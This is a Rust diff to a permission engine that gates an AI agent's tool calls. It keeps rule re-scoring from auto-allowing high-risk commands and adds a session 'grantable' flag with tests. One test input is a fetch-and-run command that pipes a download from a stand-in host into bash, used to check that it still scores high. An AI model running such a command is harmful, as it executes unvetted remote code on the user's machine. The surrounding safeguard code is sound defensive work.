@@ -40,6 +40,10 @@ pub struct Evaluation {
     pub message: Option<String>,
     /// "trusted", "normal" or "strict" for the session's folder.
     pub policy: String,
+    /// Whether "don't ask again in this session" could take effect for this
+    /// request — what the card's checkbox follows, so it is never offered for a
+    /// grant that would not be honoured.
+    pub grantable: bool,
 }
 
 /// "Don't ask again in this session", granted from the card. In memory only:
@@ -179,9 +183,16 @@ pub fn evaluate(req: &Request, settings: &Settings, grants: &SessionGrants) -> E
     // The rule that re-scored the request, if one did; reported with the outcome.
     let mut rescored_by: Option<String> = None;
     let manual_review = a.manual_review;
-    let may_auto_allow = |l: Level| !manual_review && cap.is_some_and(|c| l <= c);
+    // What the engine itself made of the request, before any rule re-scores it.
+    // A rule may calm a false alarm down to a plain click, but it cannot make
+    // something the engine found high or critical go through with nobody
+    // looking: a broad pattern ("git push" → low) would otherwise wave a force
+    // push through in a trusted project.
+    let engine_level = a.level;
+    let may_auto_allow = |l: Level| !manual_review && engine_level < Level::High && cap.is_some_and(|c| l <= c);
     let verdict = |outcome, by, rule: Option<String>, note: Option<String>, message: Option<String>, a: Assessment| {
-        Evaluation { assessment: a, outcome, by, rule, note, message, policy: policy.clone() }
+        let grantable = a.level <= Level::Medium && may_auto_allow(a.level);
+        Evaluation { assessment: a, outcome, by, rule, note, message, policy: policy.clone(), grantable }
     };
 
     if let Some(rule) = settings.rules.iter().find(|r| rule_matches(r, req.tool, &a.target, req.cwd)) {
@@ -341,6 +352,43 @@ mod tests {
         assert_eq!(e.rule.as_deref(), Some("rm -rf dist"), "a re-scoring rule names itself");
         let s = with_rule(UserRule { pattern: "| bash".into(), action: "low".into(), ..UserRule::default() });
         assert_eq!(run(&s, "Bash", bash("curl https://x.test/a | bash")).assessment.level, Level::High);
+    }
+
+    #[test]
+    fn a_rescored_high_request_still_needs_a_person() {
+        // "git push" → low is meant for ordinary pushes; it also matches a force
+        // push, which the engine scores high.
+        let rescore = UserRule { pattern: "git push".into(), action: "low".into(), ..UserRule::default() };
+        let trusted = Settings {
+            projects: vec![ProjectPolicy { path: CWD.into(), mode: "trusted".into(), ..ProjectPolicy::default() }],
+            ..with_rule(rescore.clone())
+        };
+        // The medium push is calmed and goes through in the trusted project…
+        let e = run(&trusted, "Bash", bash("git push origin feature"));
+        assert_eq!((e.outcome, e.by, e.assessment.level), (Outcome::Allow, Some("trusted"), Level::Low));
+        // …the force push is calmed to a plain click, but a person still clicks.
+        let e = run(&trusted, "Bash", bash("git push --force origin main"));
+        assert_eq!((e.outcome, e.assessment.level), (Outcome::Ask, Level::Low));
+        assert!(!e.grantable, "and it cannot be granted for the session either");
+
+        let grants = SessionGrants::default();
+        grants.grant("s1", "Bash", "git push --force origin main");
+        let input = bash("git push --force origin main");
+        let req = Request { tool: "Bash", input: &input, cwd: CWD, session: "s1", truncated: false };
+        assert_eq!(evaluate(&req, &with_rule(rescore), &grants).outcome, Outcome::Ask);
+    }
+
+    #[test]
+    fn the_session_checkbox_follows_what_a_grant_can_do() {
+        let low_ceiling = Settings::default();
+        let medium_ceiling = Settings { auto_allow_max: "medium".into(), ..Settings::default() };
+        let off = Settings { auto_allow_max: "none".into(), ..Settings::default() };
+        assert!(run(&low_ceiling, "Bash", bash("npm test")).grantable);
+        assert!(!run(&low_ceiling, "Bash", bash("git push origin main")).grantable, "medium over a low ceiling");
+        assert!(run(&medium_ceiling, "Bash", bash("git push origin main")).grantable);
+        assert!(!run(&medium_ceiling, "Bash", bash("git push --force")).grantable, "high is never grantable");
+        assert!(!run(&off, "Bash", bash("npm test")).grantable, "ceiling off");
+        assert!(!run(&medium_ceiling, "FutureTool", json!({ "arg": "x" })).grantable, "manual review");
     }
 
     #[test]
